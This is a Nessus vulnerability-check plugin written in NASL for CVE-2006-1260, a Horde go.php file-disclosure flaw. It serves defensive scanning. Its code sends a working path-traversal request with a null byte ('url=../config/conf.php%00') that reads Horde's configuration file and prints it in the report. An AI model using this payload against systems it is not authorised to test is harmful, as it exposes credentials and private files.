#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21081);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/11 13:32:17 $");

  script_cve_id("CVE-2006-1260");
  script_bugtraq_id(17117);
  script_osvdb_id(23918);

  script_name(english:"Horde go.php url Parameter Arbitrary File Access");
  script_summary(english:"Tries to read arbitrary files using Horde");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure flaw.");
  script_set_attribute(attribute:"description", value:
"The version of Horde installed on the remote host fails to validate
input to the 'url' parameter of the 'services/go.php' script before
using it to read files and return their contents.  An unauthenticated
attacker may be able to leverage this issue to retrieve the contents
of arbitrary files on the affected host subject to the privileges of
the web server user id.  This can result in the disclosure of
authentication credentials used by the affected application as well as
other sensitive information. 

Note that successful exploitation of this issue seems to require that
PHP's 'magic_quotes_gpc' be disabled, although this has not been
confirmed by the vendor.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c33a56f3");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?310ca0f6");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Horde 3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/15");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:horde:horde_application_framework");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("horde_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/horde");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP");


# Test an install.
install = get_kb_item(string("www/", port, "/horde"));
if (isnull(install)) exit(0, "Horde was not detected on port "+port);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to read a file.
  #
  # nb: Horde 3.x uses "/services"; Horde 2.x, "/util".
  foreach subdir (make_list("/services", "/util"))
  {
    if ("util" >< subdir) file = "horde.php";
    else file = "conf.php";

    r = http_send_recv3(method:"GET",
      item:string(
        dir, subdir, "/go.php?",
        "url=../config/", file, "%00:/&",
        "untrusted=1"
      ), 
      port:port
    );
    if (isnull(r)) exit(1, "The web server on port "+port+" failed to respond");
    res = r[2];

    # There's a problem if we get results that look like Horde's config file.
    if ("$conf['auth']" >< res)
    {
     report = string(
        "Here are the contents of Horde's 'config/", file, "' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );

      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
